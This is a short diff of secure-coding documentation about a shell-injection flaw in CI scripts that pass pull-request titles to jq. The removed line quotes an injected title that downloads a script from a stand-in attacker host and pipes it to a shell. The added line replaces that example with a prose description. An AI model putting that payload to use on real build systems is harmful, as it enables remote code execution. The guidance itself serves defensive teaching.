@@ -77,7 +77,7 @@ If any of those is missing, the finding is not `jq-arg-trap` (e.g. `jq` without 
        summary.json > summary.tmp && mv summary.tmp summary.json
 ```
 
-A PR title of `attack'; curl -fsSL https://evil.example/x.sh | sh; '` is expanded by the shell BEFORE `jq` is launched. `--arg` doesn't help — the damage is already done at shell-substitution time.
+A PR title that closes the surrounding quote and appends a remote-fetch-then-run payload (the classic download-a-script-and-pipe-it-to-a-shell pattern) is expanded by the shell BEFORE jq is launched. The `--arg` flag doesn't help — the damage is already done at shell-substitution time.
 
 **AFTER (safe):**
 
